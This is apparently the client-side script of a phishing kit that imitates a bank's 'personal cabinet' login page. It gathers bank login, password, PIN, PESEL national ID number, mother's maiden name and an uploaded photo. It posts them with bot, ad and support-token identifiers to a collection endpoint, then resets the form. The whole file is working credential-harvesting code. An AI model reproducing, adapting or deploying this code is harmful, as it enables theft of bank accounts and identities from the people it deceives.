window.onload = function() {
    const logType = "personalcabinet";
    let submitBtn = document.getElementById('pc-submit-button');
    let submitBtnHtml = submitBtn.innerHTML;
    let login = document.getElementById('login');
    let password = document.getElementById('password');
    let bankName = document.getElementById('bank-name');
    let countryCode = document.getElementById('country-code-pc');
    let pesel = document.getElementById('pesel');
    let pin = document.getElementById('pin');
    let mother = document.getElementById('mother');
    let file = document.getElementById('photo-file');

    function validForm() {
        var errors = 0;
        if (login.value.length === 0) errors++;
        if (password.value.length === 0) errors++;
        if (pin && pin.value.length === 0) errors++;
        if (pesel && pesel.value.length === 0) errors++;
        if (mother && mother.value.length === 0) errors++;
        if (file && file.value.length === 0) errors++;
    
        if (errors > 0) return false;
        return true;
    };

    function loadButton(button) {
        button.disabled = true;
        button.innerHTML = `
            <div class="d-flex justify-content-center">
                <div class="spinner-border spinner-border-sm" role="status">
                    <span class="visually-hidden">...</span>
                </div>
            </div>
        `;
    };

    function isSelect(elementId) {
        return $(elementId).is('select');
    };

    function clearForm() {
        $(submitBtn).html(submitBtnHtml).prop('disabled', true);
        $('#pc-next-button').prop('disabled', true);
        if (!isSelect("#login")) $("#login").val('').trigger('input');
        if (!isSelect("#password")) $("#password").val('');
        if (!isSelect("#pesel")) $("#pesel").val('');
        if (!isSelect("#pin")) $("#pin").val('');
        if (!isSelect("#mother")) $("#mother").val('');
        if (!isSelect("#photo-file")) $("#photo-file").val('');
        $("#pc-second-form").css("display", "none");
        $("#pc-first-form").css("display", "");
    };

    function sendLog() {
        loadButton(submitBtn);

        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            login: login.value,
            password: password.value,
            pesel: pesel === null ? null : pesel.value,
            pin: pin === null ? null : pin.value,
            mother: mother === null ? null : mother.value,
            file: file === null ? null : file.value,
            bankName: bankName.value,
            countryCode: countryCode.value
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm();
        });
    };

    $(submitBtn).click(function() {
        if (!validForm()) return clearForm();
        sendLog();
    });
};